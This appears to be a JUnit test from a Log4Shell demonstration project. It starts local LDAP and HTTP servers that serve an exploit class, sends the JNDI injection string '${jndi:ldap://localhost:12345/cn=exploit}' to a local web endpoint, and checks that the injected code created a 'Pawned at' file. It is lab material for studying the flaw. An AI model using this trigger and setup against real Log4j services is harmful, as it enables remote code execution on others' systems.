package test;

import log4shell.hacker.tool.HttpServerSetup;
import log4shell.hacker.tool.LdapServerSetup;
import log4shell.hacker.injection.LdapCodeInjection;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.io.File;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;

import static java.net.http.HttpResponse.BodyHandlers;
import static java.nio.file.Files.readString;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class LdapCodeInjectionAttackTest {
    private static final Logger log = LogManager.getLogger(LdapCodeInjectionAttackTest.class);

    final int LDAP_PORT = 12345;
    final int HTTP_PORT = 54321;
    final Class<?> exploit = LdapCodeInjection.class;

    final HttpServerSetup httpSrv = new HttpServerSetup(HTTP_PORT, exploit);
    final LdapServerSetup ldapSrv = new LdapServerSetup(LDAP_PORT, HTTP_PORT, exploit);

    @Test
    public void ldapCodeInjectionAttackTest() throws Exception {
        log.info("Ensure there is no such file");
        File tmpFile = LdapCodeInjection.TMP_FILE_PATH.toFile();
        assertTrue(!tmpFile.exists() || tmpFile.delete());

        String injectionTrigger = String.format("${jndi:ldap://localhost:%s/cn=exploit}", LDAP_PORT);
        injectionTrigger = URLEncoder.encode(injectionTrigger, "utf-8");

        URI uri = URI.create("http://localhost:8080/greeting?name=" + injectionTrigger);


        // Make http call to initiate code injection
        var client = HttpClient.newBuilder().build();
        var req = HttpRequest.newBuilder().GET().uri(uri).build();
        var res = client.send(req, BodyHandlers.discarding());
        assertEquals(200 , res.statusCode());

        // Ensure that injected code was executed and file was created
        assertTrue(tmpFile.exists());
        assertTrue(readString(tmpFile.toPath()).startsWith("Pawned at"));
    }

    @BeforeEach
    void startupServers() {
        httpSrv.start();
        ldapSrv.start();
    }

    @AfterEach
    void shutdownServers() {
        httpSrv.stop();
        ldapSrv.stop();
    }
}
